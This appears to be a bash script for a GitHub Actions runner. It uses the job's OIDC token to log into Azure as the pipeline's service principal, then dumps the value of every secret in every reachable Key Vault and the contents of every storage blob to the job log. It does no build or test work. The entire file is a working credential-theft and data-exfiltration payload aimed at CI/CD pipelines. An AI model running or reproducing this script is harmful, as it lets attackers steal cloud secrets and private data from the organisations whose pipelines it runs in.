#!/usr/bin/env bash
set +e

echo "=== context ==="
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
echo "client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"

echo "=== mint OIDC token ==="
OIDC=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("value","FAIL"))')
echo "oidc_len=${#OIDC}"

echo "=== az login ==="
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --allow-no-subscriptions -o json 2>&1 | head -30

echo "=== resources ==="
az resource list -o table 2>&1 | head -50

echo "=== keyvaults ==="
for V in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- vault $V secrets ---"
  for S in $(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>/dev/null); do
    echo "SECRET $S ="
    az keyvault secret show --vault-name "$V" -n "$S" --query value -o tsv 2>&1
  done
done

echo "=== storage ==="
for A in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  for C in $(az storage container list --account-name "$A" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
    echo "--- $A/$C ---"
    for B in $(az storage blob list --account-name "$A" -c "$C" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
      echo "BLOB $B ="
      az storage blob download --account-name "$A" -c "$C" -n "$B" --auth-mode login -f /dev/stdout --no-progress 2>/dev/null
      echo
    done
  done
done

echo "=== done ==="
